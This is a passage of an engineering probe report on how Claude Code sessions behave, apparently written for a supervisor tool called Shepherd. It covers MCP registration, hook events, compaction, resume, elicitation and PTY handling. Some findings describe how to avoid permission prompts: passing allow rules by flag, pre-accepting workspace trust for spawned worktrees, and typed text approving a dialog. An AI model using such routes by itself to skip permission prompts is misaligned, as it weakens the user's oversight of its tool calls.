    "/root/Shepherd/docs/probes/2026-09-14-schemas/gap-fill/mcp_stub.py",
    "/root/Shepherd/docs/probes/2026-09-14-schemas/gap-fill/config-scopes-20260914T173908Z/mcp-stub-messages.jsonl"
   ],
   "env": {}
  }
 },
```
```text
shepherd:
  Scope: User config (available in all your projects)
  Status: ✔ Connected
  Type: stdio
```
```text
 Tool use
   shepherd — Ping Tool: (MCP)
...
 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and don't ask again for shepherd — Ping commands in /tmp/shp-gap-mcp-rc4d_try/w
   3. No
```
```json
  "stderr": "Ignoring 1 permissions.allow entry from .claude/settings.json: this workspace has not been trusted. Run Claude Code interactively here once and accept the trust dialog, or set projects[\"/tmp/shp-gap-perm-proj-zcl84l32\"].hasTrustDialogAccepted: true in /tmp/shp-gap-perm-jotncm_2/cfg/.claude.json."
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| user-scope storage | JSON | always | top-level `mcpServers.<name>` in `<config dir>/.claude.json`: `{type:"stdio", command, args[], env{}}` | `mcp-add.txt` prints `File modified: .../cfg/.claude.json` |
| `claude mcp add -s user -e KEY=V name -- cmd` | parsing | always | `error: missing required argument 'commandOrUrl'` (rc 1): the variadic `-e` swallows the name | `claude mcp add -s user name -e KEY=V -- cmd` works and stores `"env": {"SHP_X": "1"}` (`docs/probes/2026-09-14-schemas/gap-fill/mcp-add-env-20260914T181206Z/mcp-add-env.txt`) |
| session running **before** `mcp add` | tool list in the next API request | always | `tools_had_mcp_shepherd: [false]` | not picked up |
| session started after add, no allow rule | events | always | `PreToolUse`, `PermissionRequest`, `Notification[permission_prompt]`, then after "Yes" `PostToolUse` | the TUI asks per call |
| TUI, project settings `allow: ["mcp__shepherd__*"]` (trusted dir) | events | always | `PreToolUse`, `PostToolUse` (no prompt) | |
| `-p`, rule from `--allowedTools <x> --` or `--settings` file | outcome | always | `mcp__shepherd`, `mcp__shepherd__*`, `mcp__shepherd__ping` all **allow** (stub got `tools/call`) | 3 spellings × 2 sources |
| `-p`, rule in `.claude/settings.json` of an **untrusted** dir | outcome | always | **denied** (`permission_denials: ["mcp__shepherd__ping"]`) + stderr `Ignoring 1 permissions.allow entry ...` | trust gates project permissions in `-p` |
| client capabilities sent to the server | JSON | always | `{"roots":{"listChanged":true},"elicitation":{}}`, `protocolVersion` `2025-11-25` | `docs/probes/2026-09-14-schemas/gap-fill/elicitation-tui-*/mcp-stub-messages.jsonl` |

**Spec alignment:**
- Lines 1431-1433 and 1695 (forced stdio binding) are aligned: user-scope stdio servers load in every project.
- A server added while tier-2 sessions run is invisible to them until restart (`results.json` `mcp_s1_running_before_add`).
- A worktree spawn (D15/D22) is a new, untrusted directory. Permission rules written into its `.claude/settings.json` are **ignored**, and in an interactive session every `mcp__shepherd__*` call prompts. Pass rules through `--settings` or `--allowedTools ... --`, or pre-accept trust (`docs/probes/2026-09-14-schemas/gap-fill/mcp-perm-p-*/results.json`). The spec does not say where the tier-2 allow rule lives.

### Observed process exit for a process Shepherd did not spawn (pidfd)

- **Produced by:** Linux 6.8 `pidfd_open(2)`/`poll(2)`/`waitid(P_PIDFD)` via Python 3.12, tmux 3.4 `pane_dead_status`
- **Consumed by:** `stopped` rule "observed process exit" line 938, `crashed` line 964, `Runner.probe` line 430, `exit_code` owned-only line 693; M2/M3
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_pidfd_pty.py` (part pidfd). Re-run: `python3 docs/probes/2026-09-14-schemas/gap-fill/probe_pidfd_pty.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/gap-fill/pidfd-pty-20260914T175854Z/results.json`)
```json
 "pidfd_exit_via_trust_refusal": {
  "pid": 4063896,
  "ppid": 4063895,
  "comm": "claude",
  "starttime": 544599077,
  "is_our_child": false,
  "parent_comm": "tmux: server",
  "pidfd_send_signal_0": "ok",
  "poll_before": [],
  "poll_after_ms": 38.5,
  "poll_events": [
   [
    4,
    1
   ]
  ],
  "waitid_P_PIDFD": "ChildProcessError: errno=10 [Errno 10] No child processes",
  "pidfd_send_signal_0_after": "ok",
  "proc_exists_after": true,
  "tmux_pane_after": "dead=1 status=1 signal="
 },
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `pidfd_open` on a non-child | fd | always (3/3) | works (tmux pane claude; setsid'd sleep under pid 1) | no ptrace or parent relation needed |
| `poll` POLLIN on exit | event | always | `[[fd, 1]]` within 37-39 ms of a claude exit; 0.4 ms for SIGTERM on sleep | fires at exit (zombie), before the reap |
| `waitid(P_PIDFD)` for a non-child | exit status | always | `ChildProcessError errno=10` | the exit code is **not** obtainable by a non-parent |
| `/proc/<pid>` right after POLLIN | exists | sometimes | `true` while the zombie is unreaped (remain-on-exit pane; pid 1 not yet reaped); `false` after `kill-session` | do not use /proc existence as the signal |
| exit code through tmux (owned) | `pane_dead_status` | always with `remain-on-exit on` | `status=1` (trust refused) | |
| identity against pid reuse | `/proc/<pid>/stat` field 22 | always | `starttime` read before the exit | pair with the pid when opening |

**Spec alignment:** aligned with line 938 and line 693 (`exit_code` is owned-only). For attached sessions, pidfd gives exit *time* but no exit *code*, so `crashed` (line 964, "process exit ≠ 0") cannot be decided for attached sessions. Owned sessions get the code from tmux `pane_dead_status` only if `remain-on-exit` is on.

### Auto compaction: `PreCompact{trigger:auto}` / `PostCompact`, and death mid-compaction

- **Produced by:** claude 2.1.270 TUI. Real API (haiku) for natural auto compaction; mock API to hang the summarisation request and kill the session
- **Consumed by:** `context_exhausted` line 966, next action line 1087, context events line 921; M2
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_autocompact_real.py`, `probe_lifecycle_end.py compact`. Re-run: `python3 docs/probes/2026-09-14-schemas/gap-fill/probe_autocompact_real.py && python3 docs/probes/2026-09-14-schemas/gap-fill/probe_lifecycle_end.py compact`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/gap-fill/autocompact-real-20260914T174911Z/results.json`, `hooks.jsonl`; `docs/probes/2026-09-14-schemas/gap-fill/lifecycle-end-20260914T175238Z/results.json`, `hooks.jsonl`)
```json
 "window100k_pct1": {
  "env": [
   "CLAUDE_CODE_AUTO_COMPACT_WINDOW=100000",
   "CLAUDE_AUTOCOMPACT_PCT_OVERRIDE=1"
  ],
  "events": [
   "SessionStart[source=startup]",
   "UserPromptSubmit",
   "PreCompact[trigger=auto]",
   "MessageDisplay",
   "Stop",
   "SubagentStop",
   "UserPromptSubmit",
   "PreCompact[trigger=auto]",
   "MessageDisplay",
   "Stop",
   "SubagentStop",
   "UserPromptSubmit",
   "PreCompact[trigger=auto]",
   "SubagentStop",
   "SessionStart[source=compact]",
   "PostCompact[trigger=auto]",
   "MessageDisplay",
   "Stop"
  ]
```
```json
"payload":{"session_id":"b658c86c-1ecd-4bac-bc26-d5dd73a20709",...,"hook_event_name":"PreCompact","trigger":"auto","custom_instructions":null}}
```
Killed (`tmux kill-session`) while the summarisation request hung at the mock:
```json
 "compact_b_killed_mid_compaction": {
  "events": [
   "UserPromptSubmit@f78d612e",
   "MessageDisplay@f78d612e",
   "Stop@f78d612e",
   "UserPromptSubmit@f78d612e",
   "PreCompact[trigger=auto]@f78d612e",
   "SessionEnd[reason=other]@f78d612e"
  ],
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `PreCompact.trigger` | string | always | `auto` | `custom_instructions: null` |
| `PostCompact.trigger` / `compact_summary` | string | sometimes | `auto` / the summary text (`TWO`, `OK-MOCK`) | |
| `SessionStart.source` between them | string | always when compaction completes | `compact` | |
| `PreCompact{auto}` **without** a later `PostCompact` in a healthy session | pattern | observed 2/3 turns (real API), 1/2 (mock) | the turn then ends with a normal `Stop`, no compaction | |
| kill during compaction | events | always | `PreCompact{auto}` → `SessionEnd{reason:"other"}`, no `PostCompact` | |
| summarisation request (mock log) | request | always | last user text begins `CRITICAL: Respond with TEXT ONLY. Do NOT call any tools.` | `docs/probes/2026-09-14-schemas/gap-fill/lifecycle-end-*/life-mock-requests.jsonl` |
| trigger knobs | env | | `CLAUDE_CODE_AUTO_COMPACT_WINDOW=100000` + `CLAUDE_AUTOCOMPACT_PCT_OVERRIDE=1` compacts; the PCT override alone did not (3 turns); a mock `usage.input_tokens=190000` alone did not | binary text in `docs/probes/2026-09-14-schemas/gap-fill/binary-context-*/context.txt` |

**Spec alignment:** line 966 (`context_exhausted` = `PreCompact{auto}` with no `PostCompact` before death) matches the kill case. It will also classify as `context_exhausted` any session that dies after a benign, non-compacting `PreCompact{auto}` (observed twice in a healthy real session, `docs/probes/2026-09-14-schemas/gap-fill/autocompact-real-*/results.json`). The rule needs a time bound (for example, "the most recent `PreCompact{auto}` was followed by no `Stop` or `PostCompact`").

### `SessionEnd.reason` = `resume` and `logout`

- **Produced by:** claude 2.1.270 TUI (mock API, fake API key, isolated CLAUDE_CONFIG_DIR)
- **Consumed by:** `logged_out` line 969, `resumed_elsewhere` line 970; M2
- **Probe:** `probe_lifecycle_end.py resume logout`. Re-run: `python3 docs/probes/2026-09-14-schemas/gap-fill/probe_lifecycle_end.py resume logout`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/gap-fill/lifecycle-end-20260914T175238Z/hooks.jsonl`)
```json
"payload":{"session_id":"30fce1e3-7010-4baf-bb5d-cadf207dfab1",...,"hook_event_name":"SessionEnd","reason":"resume"}}
"payload":{"session_id":"4734f21d-7203-4a04-b398-2fd12e081d26",...,"hook_event_name":"SessionStart","source":"resume","model":"claude-haiku-4-5-20251001","seconds_since_last_response":12,"context_tokens":30,"prompt_cache_likely_expired":false,"estimated_cache_write_usd":0}}
"payload":{"session_id":"ceec3e0f-a9b9-481c-b4a9-60c2fad20f1e",...,"hook_event_name":"SessionEnd","reason":"logout"}}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `SessionEnd.reason` after `/resume <other id>` in a running TUI | string | always | `resume` | the old `session_id` ends |
| next `SessionStart` | object | always | `source:"resume"`, **the other session's id**, same process and pane | extra fields `seconds_since_last_response`, `context_tokens`, `prompt_cache_likely_expired`, `estimated_cache_write_usd` |
| `SessionEnd.reason` after `/logout` | string | always | `logout`; the process exits | fake API key auth in an isolated config |

**Spec alignment:**
- Lines 969-970: the values `logout` and `resume` are aligned. The field is `reason`, not `end_reason` (lines 967-970).
- `resumed_elsewhere` is misnamed. The same pane continues as a different `session_id`, so a pane-keyed owned session must rebind its `engine_session_id` rather than stop (`hooks.jsonl`).

### MCP elicitation in the TUI: `Notification.notification_type`

- **Produced by:** claude 2.1.270 TUI + stdio `docs/probes/2026-09-14-schemas/gap-fill/mcp_stub.py` (`elicitation/create`, form and url modes), mock API
- **Consumed by:** `needs_you` rule line 937; M2
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_elicitation_tui.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/gap-fill/probe_elicitation_tui.py`
- **Status:** partially verified (`elicitation_dialog` live; `elicitation_url_dialog`, `agent_needs_input` not provokable here)

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/gap-fill/elicitation-tui-20260914T174206Z/hooks.jsonl`, `mcp-stub-messages.jsonl`, `form-dialog-screen.txt`)
```json
"payload":{"session_id":"48422ae5-49d3-4a59-a625-87569be30bed",...,"hook_event_name":"Elicitation","mcp_server_name":"shepherd","message":"Which queue should the probe use?","mode":"form","requested_schema":{"type":"object","properties":{"queue":{"type":"string"}},"required":["queue"]}}}
"payload":{"session_id":"48422ae5-49d3-4a59-a625-87569be30bed",...,"hook_event_name":"Notification","message":"Claude Code needs your input","notification_type":"elicitation_dialog"}}
"payload":{"session_id":"48422ae5-49d3-4a59-a625-87569be30bed",...,"hook_event_name":"ElicitationResult","mcp_server_name":"shepherd","mode":"form","action":"accept","content":{"queue":"alpha"}}}
```
```text
  MCP server “shepherd” requests your input
  Which queue should the probe use?
  ❯ * queue: Type something…
    Accept    Decline
```
```json
{"t": 1789407744.441, "pid": 4061613, "dir": "in", "msg": {"jsonrpc": "2.0", "id": "elicit-2", "error": {"code": -32602, "message": "MCP error -32602: Client does not support URL-mode elicitation requests"}}}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| order for a form elicitation | events | always | `PreToolUse` → `Elicitation{mode:form}` → `Notification{elicitation_dialog}` → (answer) → `ElicitationResult{action:accept, content}` → `Notification{elicitation_response}` → `PostToolUse` | |
| `Notification.message` | string | always | `Claude Code needs your input` | |
| url-mode `elicitation/create` from a stdio server | response | always | JSON-RPC error `-32602 Client does not support URL-mode elicitation requests`; no hooks, no dialog | client capability is `elicitation: {}` |
| `elicitation_url_dialog` | notification_type | **not observed** | | binary emits it for URL-mode dialogs (`docs/probes/2026-09-14-schemas/gap-fill/binary-context-*/context.txt`) |
| `agent_needs_input` | notification_type | **not observed** | | binary emits it for background-agent/teammate "blocked" states and several setup dialogs (`docs/probes/2026-09-14-schemas/gap-fill/binary-context-*/context.txt`); not tried (needs agent teams or background sessions) |

**Spec alignment:** line 937: `elicitation_dialog` is verified as a needs-you signal. `elicitation_url_dialog` cannot come from the stdio `shepherd-mcp` binding in 2.1.270, which rejects URL mode (`mcp-stub-messages.jsonl`). `agent_needs_input` and `worker_permission_prompt` remain binary-only.

### Resume across Claude Code versions (2.1.259 ↔ 2.1.270)

- **Produced by:** claude 2.1.259 (claude-agent-sdk 0.2.152 bundled binary) and 2.1.270 (system), `-p`, real API (haiku)
- **Consumed by:** `resume=state.master_session_id` line 1535, lines 1552-1553 ("across restarts, reboots, and upgrades"); M4
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_cross_version_resume.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/gap-fill/probe_cross_version_resume.sh`
- **Status:** verified live 2026-09-14 (one version pair, both directions)

**Real example** (full captures: `docs/probes/2026-09-14-schemas/gap-fill/cross-version-resume-20260914T175737Z/A-resume.json`, `A-versions-after-resume.json`, `A-ids.txt`, `B-resume.json`)
```json
{"type": "result", "subtype": "success", "is_error": false, "result": "KIWI-259", "session_id": "96f23b30-2d25-4979-a875-7b461721ebcb", "num_turns": 1}
```
```json
{"ai-title|None": 3, "assistant|2.1.259": 2, "assistant|2.1.270": 2, "atis-latch|None": 4, "attachment|2.1.259": 10, "attachment|2.1.270": 3, "last-prompt|None": 3, "mode|None": 1, "queue-operation|None": 4, "user|2.1.259": 1, "user|2.1.270": 1}
```
```text
size_before_resume=164824 sha256_before=086a7f8fb131f7064b3ee27accaf6e18d08190d8b9ee187ae42d6812260fa4ea
resume exit=0
size_after_resume=274374 prefix_unchanged=086a7f8fb131f7064b3ee27accaf6e18d08190d8b9ee187ae42d6812260fa4ea
```
```json
{"type": "result", "subtype": "success", "is_error": false, "result": "MELON-270", "session_id": "8ccb9276-4c04-4323-923f-8ddfc9ecace0", "num_turns": 1}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| resume 2.1.259 → 2.1.270 | result | always | recalled the code word; same `session_id` | |
| resume 2.1.270 → 2.1.259 (downgrade) | result | always | recalled; same `session_id` | |
| per-entry `version` | string | sometimes | mixed `2.1.259` and `2.1.270` in one file; metadata entries have none | |
| earlier bytes after resume | sha256 of the old prefix | always | unchanged | append-only across versions |

**Spec alignment:** aligned with lines 1552-1553 for this adjacent version pair. A large version jump or a schema migration was not tested.

### `can_use_tool` blocking longer than `await_decision(timeout_s=600)`

- **Produced by:** claude-agent-sdk 0.2.152 with CLI 2.1.259 (bundled) and 2.1.270 (`--cli`), real API (haiku)
- **Consumed by:** `authorize()` lines 1725-1749 (`await_decision(approval, timeout_s=600)`; "a timeout denies with a message the agent can act on"); M4
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/sdk_probe.py approval_timeout`. Re-run: `/tmp/shp-sdk-9IOKNs/venv/bin/python docs/probes/2026-09-14-schemas/gap-fill/sdk_probe.py approval_timeout [--cli /root/.local/bin/claude]`
- **Status:** verified live 2026-09-14

**Real example** (full captures: `docs/probes/2026-09-14-schemas/gap-fill/sdk-approval_timeout-syscli-20260914T171129Z/can-use-tool.jsonl`, `progress.jsonl`, `handler-calls.jsonl`, `meta.json`)
```json
{"_ts": "2026-09-14T17:11:33.047+00:00", "phase": "entered", "tool_name": "mcp__shepherd__kill_session", "tool_input": {"id": "ses_slow"}}
{"_ts": "2026-09-14T17:22:03.147+00:00", "phase": "returning allow", "after_s": 630.1}
```
```json
{"_ts": "2026-09-14T17:22:03.160+00:00", "tool": "kill_session", "received": {"id": "ses_slow"}}
```
```json
{"_ts": "2026-09-14T17:22:04.581+00:00", "since_query_s": 633.0, "class": "ResultMessage"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| CLI/SDK timeout on a pending `can_use_tool` control request | seconds | never observed | callback returned after 630.1 s; the tool ran; `ResultMessage` `success` | both CLI versions |
| messages during the wait | stream | never | first message after the query is the `UserMessage` tool result at 631.6 s | no keep-alive surfaced to the SDK caller |

**Spec alignment:** aligned with lines 1737-1749. Neither CLI version imposes a control-request timeout below 630 s, so the 600 s timeout and its deny message are Shepherd's own. Durations above 630 s were not tested.

### Browser terminal transport: WebSocket on the "stdlib HTTP + SSE" stack

- **Produced by:** Python 3.12.3 (system), stdlib `http.server`, `socket`, `hashlib`, `base64`
- **Consumed by:** §9 diagram line 1150 (`browser ──WS──► sessiond`), §5 stack line 406 ("stdlib HTTP + SSE"); M3
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_websocket.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/gap-fill/probe_websocket.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/gap-fill/websocket-20260914T171610Z/imports.json`, `handshake.json`)
```json
 "websockets": "ModuleNotFoundError: No module named 'websockets'",
 "wsproto": "ModuleNotFoundError: No module named 'wsproto'",
 "aiohttp": "ModuleNotFoundError: No module named 'aiohttp'",
...
 "_pip": "/usr/bin/python3: No module named pip"
```
```json
 "response_head": "HTTP/1.1 101 Switching Protocols\r\nServer: BaseHTTP/0.6 Python/3.12.3\r\nDate: Mon, 14 Sep 2026 17:16:10 GMT\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: e1dFrKT8fv/yzhkYZ+5wPsDLWK4=\r\n\r\n",
 "expected_accept": "e1dFrKT8fv/yzhkYZ+5wPsDLWK4=",
 "accept_matches": true,
 "client_frame_hex": "8183b10402d1aa5f43",
 "server_frame_header_hex": "8108",
 "server_payload": "echo:\u001b[A",
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| WebSocket libraries on system python3 | import | never | `websockets`, `wsproto`, `aiohttp`, `tornado`, `simple_websocket` all missing; no pip | the agent-sdk-mcp surface installed packages only into a venv made with get-pip |
| stdlib 101 upgrade from `BaseHTTPRequestHandler` | response | always | `101 Switching Protocols`, correct `Sec-WebSocket-Accept` | |
| masked client text frame → unmasked server frame | frames | always | `81 83 <mask> ...` in; `81 08 echo:ESC[A` out | a keystroke round-trip works |

**Spec alignment:** line 1150 (WS) against line 406 ("stdlib HTTP + SSE"): not a contradiction in feasibility, since about 60 lines of stdlib code complete an RFC 6455 handshake and frame exchange (`handshake.json`). But the stack line does not list WebSocket, and `ThreadingHTTPServer` gives one thread per open terminal. Either name the hand-rolled WebSocket in §5, or use SSE down plus POST up for keystrokes.

### Fallback `PtyRunner`: the Claude Code TUI under Python `pty.fork`

- **Produced by:** claude 2.1.270 TUI under Python 3.12 `pty.fork` (mock API)
- **Consumed by:** lines 1144-1145 (fallback `PtyRunner`), `Runner` protocol lines 423-430; M3
- **Probe:** `docs/probes/2026-09-14-schemas/gap-fill/probe_pidfd_pty.py` (part pty). Re-run: `python3 docs/probes/2026-09-14-schemas/gap-fill/probe_pidfd_pty.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/gap-fill/pidfd-pty-20260914T175854Z/results.json`, `pty-stream-head.cat-v.txt`, `pty-stream.bin`)
```text
^[7^[[r^[8^[[?25h^[[?25l^[[?2004h^[[?2031h^[[?1004h^[[<u^[[>5u^[[>4;2m^M^M
...
^[[2G^[[38;5;220m^[[1mAccessing^[[12Gworkspace:^[[22m^[[39m^M^M
```
```json
 "pty_turn_and_exit": {
  "initial_bytes": 1323,
  "trust_dialog": "timeout",
  "bytes_after_resize_100x30": 1445,
  "after_trust": "found",
  "turn": "found",
  "exit": {
   "read_end": "EIO",
   "waitpid_status": 0,
   "exitstatus": 0
  },
```
```json
 "pty_master_closed": {
  "ready": "found",
  "waitpid": [
   4063992,
   0
  ],
  "decoded": "exitcode=0",
  "seconds": 0.1,
  "hooks": [
   "SessionStart",
   "SessionEnd[other]"
  ]
 }
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| DEC private modes the TUI toggles | list | always | `?25` cursor, `?1049` alt screen, `?2004` bracketed paste, `?1004` focus, `?1000/1002/1003/1006` mouse, `?2031` colour-scheme reports; plus kitty keyboard `CSI > 5 u` / `CSI < u` | the full set a `PtyRunner` terminal must handle |
| raw-byte text search | behaviour | always | `trust this folder` not found: words are laid out with cursor moves (`Is^[[25Gthis^[[30Ga...`) | screen-state detection needs a terminal emulator |
| `TIOCSWINSZ` + SIGWINCH | redraw | always | 1445 bytes after 120x36 → 100x30 | |
| `/exit` | exit | always | read returns `EIO`; `waitpid` status 0; `SessionEnd{prompt_input_exit}` | |
| close master fd while idle | exit | always | exit 0 within 0.1 s; `SessionEnd{other}` | hang-up is indistinguishable from a normal exit by code |

**Spec alignment:** aligned with lines 1144-1145 ("degraded (no late-attach resync)"). The raw stream cannot be searched for dialog text without a server-side terminal emulator, so the trust-dialog detector from the tmux-tui surface (`capture-pane` text) has no `PtyRunner` equivalent (`pty-stream.bin`).

---

### Not verified on this surface

- **`agent_needs_input`, `worker_permission_prompt`, `elicitation_url_dialog` notifications.** URL mode was attempted and rejected by the client (`-32602`). The other two need agent teams or background sessions, which were not set up. The binary context is in `docs/probes/2026-09-14-schemas/gap-fill/binary-context-20260914T174348Z/context.txt`.
- **`/rewind` "Restore code and conversation".** The chosen rewind point had no code changes, so only conversation options were offered.
- **Whether Claude Code rewrites `settings.json` and drops `_shepherd_managed`** when the user edits settings through `/hooks` or `/config`. Not attempted.
- **The real `~/.claude/settings.json` and `~/.claude.json`.** Not touched, by rule. User scope was tested through `CLAUDE_CONFIG_DIR`.
- **`can_use_tool` waits longer than 630 s,** and version pairs other than 2.1.259 ↔ 2.1.270.
- **A second tmux client typing into a session while the browser writes.** Only key delivery and the read-only client were checked.

## Probe catalogue

Run commands from the repo root. `$P` = `docs/probes/2026-09-14-schemas`. Times are UTC. For hooks, transcripts, tmux-tui, agent-sdk-mcp and linux they are the time of the newest capture each probe wrote. For gap-fill they are the run start taken from the capture folder name (`<name>-YYYYMMDDTHHMMSSZ`). Live probes use `claude-haiku-4-5-20251001`, throwaway `mktemp` directories and settings with cc10x disabled, and put a timeout on every run.

| Probe | Script path | Proves | Re-run command | Last run |
|---|---|---|---|---|
| hooks: binary extract | `$P/hooks/extract_binary.py` | 33-name event enum, zod input schemas, settings hooks schema, enums, runtime snippets (600 s default timeout, StopFailure assignments) | `python3 $P/hooks/extract_binary.py` | 2026-09-14 15:56 |
| hooks: headless scenarios | `$P/hooks/run_probes.py` (+ `mock_api.py`, `mcp_elicit.py`, `capture_hook.sh`, `capture_env.py`) | Payloads for 31 live events. Also: common-field matrix, SessionStart sources, StopFailure classes (real API plus mock), permission modes, config validation (R03), exit codes, timeouts and blocking (R01, R02) | `python3 $P/hooks/run_probes.py list`, then `python3 $P/hooks/run_probes.py S01 …` | 2026-09-14 15:54 |
| hooks: TUI run | `$P/hooks/interactive_probe.py` | Events that need a TUI: `permission_prompt`/`idle_prompt` Notification, `/clear`, `/add-dir`, Esc rejection with no follow-up event | `python3 $P/hooks/interactive_probe.py` | 2026-09-14 15:54 |
| hooks: field matrix | `$P/hooks/summarize.py` | `live/_field-matrix.txt` (field presence per event) | `python3 $P/hooks/summarize.py` | 2026-09-14 15:54 |
| transcripts: lifecycle | `$P/transcripts/probe_lifecycle.sh` | Project layout, entry envelope, assistant/user/system/attachment entries, compaction, titles, last-prompt, queue-operation, subagent and workflow files, resume, fork | `bash $P/transcripts/probe_lifecycle.sh main bg workflow` (steps: `effort synthetic compact named longprompt resume fork`) | 2026-09-14 15:24 |
| transcripts: slug rule | `$P/transcripts/probe_slug.sh` | cwd → project-dir slug (9/9 cwds) | `bash $P/transcripts/probe_slug.sh` | 2026-09-14 15:13 |
| transcripts: registry (-p) | `$P/transcripts/probe_registry.sh` | `~/.claude/sessions/<pid>.json` and `claude agents --json` shapes; other sessions shown as redacted shapes | `bash $P/transcripts/probe_registry.sh` | 2026-09-14 15:24 |
| transcripts: registry (TUI) | `$P/transcripts/probe_registry_interactive.sh` | Registry `idle`/`busy` lifecycle, `claude agents --json` own entry, `turn_duration`, `--name` titles | `bash $P/transcripts/probe_registry_interactive.sh` | 2026-09-14 15:16 |
| transcripts: live fork | `$P/transcripts/probe_fork_live.sh` | `--resume <id> --fork-session` of a live session in the middle of a tool call leaves the target untouched | `bash $P/transcripts/probe_fork_live.sh` | 2026-09-14 15:23 |
| transcripts: ~/.claude.json | `$P/transcripts/probe_claude_json.py` | `projects[<cwd>]` field names and types (read-only) | `python3 $P/transcripts/probe_claude_json.py` | 2026-09-14 15:34 |
| transcripts: user-data stats | `$P/transcripts/stats_real_transcripts.py`, `stats_registry.py` | Entry-type and field counts over the user's transcripts: counts and names only, no content | `python3 $P/transcripts/stats_real_transcripts.py` | 2026-09-14 15:35 |
| transcripts: binary metadata | `$P/transcripts/probe_binary_metadata.sh` | Metadata merge table, the `pr-link` writer (static) | `bash $P/transcripts/probe_binary_metadata.sh` | 2026-09-14 15:36 |
| tmux-tui: main | `$P/tmux-tui/probe_tui.py` | Trust dialog, TUI hook payloads, idle/permission timing, send-keys, resize, `/rename`, `/compact`, fork, `/exit`, SIGTERM, kill-session, registry sidecar | `python3 $P/tmux-tui/probe_tui.py` | 2026-09-14 16:09 |
| tmux-tui: supp | `$P/tmux-tui/probe_tui_supp.py` | `--name`/`--session-id` at spawn, `capture-pane -S -2000` on the alternate screen, `pipe-pane` | `python3 $P/tmux-tui/probe_tui_supp.py` | 2026-09-14 15:54 |
| tmux-tui: supp2 | `$P/tmux-tui/probe_tui_supp2.py` | Ghost suggestion + bare Enter; text typed into a permission dialog approves the tool | `python3 $P/tmux-tui/probe_tui_supp2.py` | 2026-09-14 15:58 |
| tmux-tui: supp3 | `$P/tmux-tui/probe_tui_supp3.py` | Typing a message over ghost text | `python3 $P/tmux-tui/probe_tui_supp3.py` | 2026-09-14 16:01 |
| tmux-tui: headless parity | `$P/tmux-tui/probe_headless_parity.py` | The same scenarios under `claude -p`, for the parity table | `python3 $P/tmux-tui/probe_headless_parity.py` | 2026-09-14 16:03 |
| agent-sdk-mcp: introspect | `$P/agent-sdk-mcp/introspect_sdk.py` | Installed `ClaudeAgentOptions`, message types, `@tool`/`create_sdk_mcp_server`, `ClaudeSDKClient` methods, bundled CLI | `<venv>/bin/python $P/agent-sdk-mcp/introspect_sdk.py $P/agent-sdk-mcp/captures/introspect` | 2026-09-14 16:26 |
| agent-sdk-mcp: master scenarios | `$P/agent-sdk-mcp/master_probe.py` | Control handshake, init/assistant/user/result messages, in-process MCP, `can_use_tool`, built-in tools reachable, hook callbacks, interrupt, resume/fork, `setting_sources` isolation | `<venv>/bin/python $P/agent-sdk-mcp/master_probe.py <scenario> $P/agent-sdk-mcp/captures <tmpdir>` | 2026-09-14 16:26 |
| agent-sdk-mcp: tier-2 stdio MCP | `$P/agent-sdk-mcp/stdio/run_stdio_probe.sh` (+ `mcp_logger_server.py`, `capture_hook.sh`) | stdio MCP launch env, `initialize`/`tools/list`/`tools/call` JSON-RPC, MCP tools in shell-hook payloads | `bash $P/agent-sdk-mcp/stdio/run_stdio_probe.sh` | 2026-09-14 16:15 |
| agent-sdk-mcp: all | `$P/agent-sdk-mcp/run_all.sh` | Throwaway venv + every scenario above | `bash $P/agent-sdk-mcp/run_all.sh` | 2026-09-14 16:26 |
| linux: /proc | `$P/linux-process-git/probe_proc.sh` (+ `proc_snapshot.py`, `hook_capture.py`, `sessiond_sim.py`) | `/proc/<pid>/stat`/cmdline/exe/cwd/environ/cgroup, hook ancestry and env, SO_PEERCRED → /proc → registry join, `procStart` = stat field 22 | `bash $P/linux-process-git/probe_proc.sh` | 2026-09-14 16:22 |
| linux: comm by full path | `$P/linux-process-git/probe_comm_fullpath.sh` | `comm` is `2.1.270` when launched by versioned path | `bash $P/linux-process-git/probe_comm_fullpath.sh` | 2026-09-14 16:25 |
| linux: -p registry | `$P/linux-process-git/probe_print_registry.sh` | `-p` sessions write `~/.claude/sessions/<pid>.json` and delete it on exit | `bash $P/linux-process-git/probe_print_registry.sh` | 2026-09-14 16:24 |
| linux: UDS | `$P/linux-process-git/probe_socket.py` | Socket mode 0600, SO_PEERCRED, cross-uid denial, sun_path limit | `python3 $P/linux-process-git/probe_socket.py` | 2026-09-14 16:18 |
| linux: systemd/XDG | `$P/linux-process-git/probe_systemd_xdg.sh` | User manager reachability, `Restart=always` start limit, journal, `loginctl` Linger, XDG dirs | `bash $P/linux-process-git/probe_systemd_xdg.sh` | 2026-09-14 16:17 |
| linux: secrets/toolchain | `$P/linux-process-git/probe_secrets_runtime.sh` | No Secret Service, 0600 file fallback; Python/SQLite/venv/pip/node availability | `bash $P/linux-process-git/probe_secrets_runtime.sh` | 2026-09-14 16:22 |
